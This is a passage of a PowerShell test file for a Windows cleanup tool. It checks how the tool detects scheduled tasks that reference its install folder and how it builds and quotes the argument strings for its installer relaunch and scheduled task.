    $inside = Join-Path -Path $root -ChildPath 'Run.ps1'

    $hits = @(
        @{ Name = 'in the -File argument'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments ('-File "{0}" -Scheduled' -f $inside)) },
        @{ Name = 'in the -Command payload'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments ("-Command ""& '{0}' -Scheduled""" -f $inside)) },
        @{ Name = 'as the executable itself'; Action = (New-StubAction -Execute (Join-Path -Path $root -ChildPath 'tool.exe') -Arguments '') },
        @{ Name = 'as the working directory'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments '-Command Get-Date' -WorkingDirectory $root) }
    )

    foreach ($case in $hits) {
        $task = New-StubTask -TaskPath '\Other\' -Description 'someone else' -Action @($case.Action)
        Assert-True (Test-WacTaskReferencesRoot -Task @($task) -DeploymentRoot $root) `
            ('a task referencing the deployment [{0}] was not detected, so its files would be deleted under it' -f $case.Name)
    }

    $elsewhere = New-StubTask -TaskPath '\Other\' -Description 'someone else' `
        -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments '-File "C:\Other\Thing.ps1"' -WorkingDirectory 'C:\Other'))
    Assert-False (Test-WacTaskReferencesRoot -Task @($elsewhere) -DeploymentRoot $root) `
        'an unrelated task blocked the deployment removal, which would make uninstall impossible'
    Assert-False (Test-WacTaskReferencesRoot -Task @() -DeploymentRoot $root) 'no tasks at all must not block removal'
    Assert-False (Test-WacTaskReferencesRoot -Task @($null) -DeploymentRoot $root) 'a null entry must not block removal'
}

Test-Case 'Get-WacTaskDescription always carries the sentinel Test-WacTaskIsOurs looks for' {
    $description = Get-WacTaskDescription
    Assert-True $description.Contains((Get-WacTaskSentinel)) $description
    Assert-Equal 'WindowsAutoCleanup' (Get-WacTaskName)
    Assert-Equal '\WindowsAutoCleanup\' (Get-WacTaskFolder)
}

# ---------------------------------------------------------------------------------------------
# Argument vectors (ledger P0-2)
# ---------------------------------------------------------------------------------------------

Test-Case 'Get-WacInstallerRelaunchArgument emits -ResetWindowsUpdateBase:$false explicitly' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\a b\Install.ps1' -DailyRunTime '03:00' `
        -ResetWindowsUpdateBase $false -EnableLegacyDiskCleanup -NoPause

    # -Command, not -File: Windows PowerShell 5.1 cannot bind -Switch:$false under -File at all, and
    # the installer relaunches through powershell.exe whenever PowerShell 7 is absent.
    # Build the payload OUTSIDE the array literal. Inside @( ), a newline separates elements even
    # after a trailing '+', so writing the concatenation inline silently yields two elements.
    # The payload seeds $LASTEXITCODE before calling the script: a child that never ran at all
    # leaves it undefined, and `exit $null` is exit 0 - a total failure reported as success.
    $payloadText = "`$LASTEXITCODE = 1; & 'C:\a b\Install.ps1' -ResetWindowsUpdateBase:`$false " +
        "-EnableLegacyDiskCleanup -NoPause -DailyRunTime '03:00'; exit `$LASTEXITCODE"
    $expected = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $payloadText)

    Assert-Equal $expected.Count @($vector).Count (($vector) -join ' ')
    for ($i = 0; $i -lt $expected.Count; $i++) {
        Assert-Equal $expected[$i] ([string]$vector[$i]) ('element {0}' -f $i)
    }

    $payload = [string]$vector[4]
    Assert-False ([regex]::IsMatch($payload, '(?<![\w:$])-ResetWindowsUpdateBase(?![\w:])')) `
        'the bare switch form would let the child re-apply its own default'
    Assert-False ($payload.Contains('-PruneSupersededDrivers')) 'a switch the caller never passed was forwarded'
}

Test-Case 'Get-WacInstallerRelaunchArgument defaults ResetWindowsUpdateBase to an explicit $true' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\Install.ps1' -DailyRunTime '20:00'

    $payload = [string]$vector[4]
    Assert-True ($payload.Contains('-ResetWindowsUpdateBase:$true')) (($vector) -join ' ')
    Assert-False ([regex]::IsMatch($payload, '(?<![\w:$])-ResetWindowsUpdateBase(?![\w:])')) $payload
    Assert-False ($payload.Contains('-NoPause')) $payload
    Assert-True ($payload.Contains("-DailyRunTime '20:00'")) $payload
}

Test-Case 'The relaunch vector survives quoting into a command line with spaces in the path' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\a b\Install.ps1' -DailyRunTime '03:00' `
        -ResetWindowsUpdateBase $false -NoPause

    $commandLine = ConvertTo-WacCommandLine -ArgumentList $vector

    # Two quoting layers, each applied once: single quotes for the PowerShell parser inside the
    # payload, double quotes around the payload for CreateProcess.
    $expected = '-NoProfile -ExecutionPolicy Bypass -Command ' +
        '"$LASTEXITCODE = 1; & ' + "'C:\a b\Install.ps1'" + ' -ResetWindowsUpdateBase:$false -NoPause ' +
        "-DailyRunTime '03:00'; exit " + '$LASTEXITCODE"'
    Assert-Equal $expected $commandLine
}

Test-Case 'The relaunch vector is a plain string array, so Start-Process cannot re-interpret it' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\Install.ps1' -DailyRunTime '03:00'

    Assert-True (@($vector).Count -gt 0)
    foreach ($item in $vector) {
        Assert-True ($item -is [string]) ('element type was {0}' -f $item.GetType().FullName)
    }
}

Test-Case 'Get-WacTaskActionArgument builds the exact argument string the task will run' {
    $arguments = Get-WacTaskActionArgument -RunScript 'C:\Program Files\WindowsAutoCleanup\Run.ps1' -ResetWindowsUpdateBase $false

    $expected = '-NoProfile -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command ' +
        '"$LASTEXITCODE = 1; & ' + "'C:\Program Files\WindowsAutoCleanup\Run.ps1'" +
        ' -ResetWindowsUpdateBase:$false -Scheduled; exit $LASTEXITCODE"'
    Assert-Equal $expected $arguments
}

Test-Case 'Get-WacTaskActionArgument forwards only the opt-ins the caller actually passed' {
    $none = Get-WacTaskActionArgument -RunScript 'C:\Wac\Run.ps1' -ResetWindowsUpdateBase $true
    Assert-True ($none -match [regex]::Escape('-ResetWindowsUpdateBase:$true')) $none
    Assert-False ($none -match 'PruneSupersededDrivers') $none
    Assert-False ($none -match 'EnableLegacyDiskCleanup') $none

    $all = Get-WacTaskActionArgument -RunScript 'C:\Wac\Run.ps1' -ResetWindowsUpdateBase $true `
        -PruneSupersededDrivers -EnableLegacyDiskCleanup
    Assert-True ($all -match 'PruneSupersededDrivers') $all
    Assert-True ($all -match 'EnableLegacyDiskCleanup') $all

    $ownership = Get-WacTaskScriptPath -Arguments $all
    Assert-Equal 'C:\Wac\Run.ps1' $ownership 'the action string must round-trip through the ownership parser'
}

Complete-TestRun
